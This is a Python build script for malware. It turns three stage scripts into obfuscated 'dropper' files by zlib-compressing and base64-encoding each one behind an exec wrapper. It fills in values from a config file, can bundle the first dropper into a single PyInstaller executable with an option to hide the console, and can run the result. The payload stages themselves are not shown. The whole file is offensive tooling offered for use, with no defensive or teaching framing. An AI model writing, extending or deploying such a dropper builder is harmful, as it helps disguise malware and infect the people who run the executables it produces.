import json
import os
import sys
import zlib, base64
import argparse

parser = argparse.ArgumentParser(description="Generate ovfuscated payloads")

parser.add_argument("--debug", metavar="debug", type=bool, help="Build in debug (show the console when exe is run)")
parser.add_argument("--exe", metavar="exe", type=bool, help="specify to build an executable")
parser.add_argument("--output", metavar="output", type=str, help="The name of the exe to be generated")
parser.add_argument("--run_exe", metavar="run_exe", type=bool, help="Run the outputted exe")

args = parser.parse_args()


print("Building with config: config.json")
config = {}
with open("config.json", "r") as f:
    config = json.load(f)

def obfuscate(text: str):
    compressed = zlib.compress(text.encode())
    encoded = base64.b64encode(compressed)
    code = f"import zlib,base64\nexec(zlib.decompress(base64.b64decode(\"{encoded.decode()}\".encode())).decode())"
    return code

def obfuscate_files(files: dict):
    for f, output in files.items():
        if os.path.exists(output): os.remove(output)
        content = ""
        with open(f, "r") as f:
            content = f.read()
        for key, value in config.items():
            content = content.replace(key, value)
        with open(output, "w") as f:
            f.write(obfuscate(content))
        # os.system("python pyobfx.py -f obfuscation_temp.py")
        # os.rename("obfuscation_temp_obfx.py", output)
        # os.remove("obfuscation_temp.py")

debug = args.debug

obfuscate_files({"stage1.py": "dropper.py", "stage2.py": "dropper2.py", "stage3.py": "dropper3.py"})

exe_name = args.output
if args.exe:
    requirements = ""
    with open("module_requirements.txt", "r") as f:
        requirements = f.read()
    cmd = "python -m PyInstaller dropper.py --onefile --name " + exe_name if exe_name else "dropper"
    for req in requirements.split("\n"):
        cmd += " --hidden-import " + req
    print("$ " + cmd)
    os.system(cmd)

if args.run_exe:
    os.chdir("dist")
    os.system(exe_name if ".exe" in exe_name else exe_name + ".exe")